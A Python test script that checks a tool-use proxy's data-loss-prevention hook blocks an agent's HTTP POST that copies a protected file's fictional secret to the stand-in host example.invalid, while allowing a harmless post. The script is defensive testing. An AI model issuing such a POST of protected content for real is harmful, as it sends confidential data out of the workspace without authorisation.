"""Exercise the configured Hook function with real judges and fictional content.
No host Hook is installed and no described network request is executed.
"""
import json
import sqlite3
import tempfile
from pathlib import Path

from tooluseproxy.engine.journal import Journal, event_from
from tooluseproxy.engine.runtime import process_hook
from tooluseproxy.engine import runtime
from tooluseproxy.engine.judge import CodexSemanticJudge

STAGES = []

class CountingJudge(CodexSemanticJudge):
    def __call__(self, records):
        STAGES.append(records.get('stage', 'provenance'))
        return super().__call__(records)



def main():
    runtime.CodexSemanticJudge = CountingJudge
    with tempfile.TemporaryDirectory(prefix='tup-dlp-') as directory:
        root = Path(directory).resolve()
        secret = 'Fictional confidential calibration: coefficient is 0.7314 and internal codename is SILVER-SAMPLE.'
        (root / 'private.txt').write_text(secret)
        store = Journal(root / 'events.db')
        store.initialize()
        workspace = store.register_workspace(str(root)).workspace_id
        with sqlite3.connect(store.db_path) as conn:
            conn.execute('INSERT INTO protected_sources(source_id,path,source_type,sensitivity,policy_tags_json,workspace_id,source_key) VALUES (?,?,?,?,?,?,?)',
                         ('fixture', 'private.txt', 'file', 'secret', '[]', workspace, 'fixture'))
        (root / 'semantic-flow.json').write_text(json.dumps({'workspaces': {workspace: dict(provider='codex_exec', send_recorded_content=True, mode='enforce', failure_policy='allow_with_warning')}}))
        for name, body in [('copy', secret), ('independent', 'A public welcome message with no confidential information.')]:
            event = event_from('pre_tool_use', dict(cwd=str(root), session_id=name, tool_use_id=name,
                tool_name='HTTP POST', tool_input={'url': 'https://example.invalid/receive', 'body': body}), str(root))
            STAGES.clear()
            response = process_hook(store, event)
            with sqlite3.connect(store.db_path) as conn:
                action, reason = conn.execute('SELECT action,reason FROM semantic_flow_decisions WHERE event_id=?', (event.event_id,)).fetchone()
            print(json.dumps(dict(case=name, action=action, reason=reason, model_stages=STAGES)), flush=True)
            assert action == ('block' if name == 'copy' else 'allow')
            if name == 'copy':
                assert reason == 'protected_content_match'
                assert response['hookSpecificOutput']['permissionDecision'] == 'deny'


if __name__ == '__main__':
    main()
